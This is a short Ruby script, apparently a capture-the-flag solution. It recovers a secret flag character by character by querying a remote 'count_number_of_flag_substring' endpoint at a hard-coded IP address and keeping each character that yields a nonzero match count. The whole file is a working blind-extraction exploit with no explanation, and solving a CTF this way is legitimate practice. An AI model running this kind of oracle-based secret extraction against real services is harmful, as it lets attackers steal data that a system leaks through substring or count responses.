require 'net/http'
require 'uri'

flag = 'flag='
cand = ('a'..'z').to_a + ['_', '{', '}']

while true
	found = false
	cand.each do |c|
		url = "http://210.146.64.36:30840/count_number_of_flag_substring/?str=#{flag + c}&count=count"
		res = Net::HTTP::get(URI.parse(url))
		if res =~ /member of .+ are [1-9]/
			found = true
			flag += c
			puts flag
			break
		end
	end
	break unless found
end

puts flag
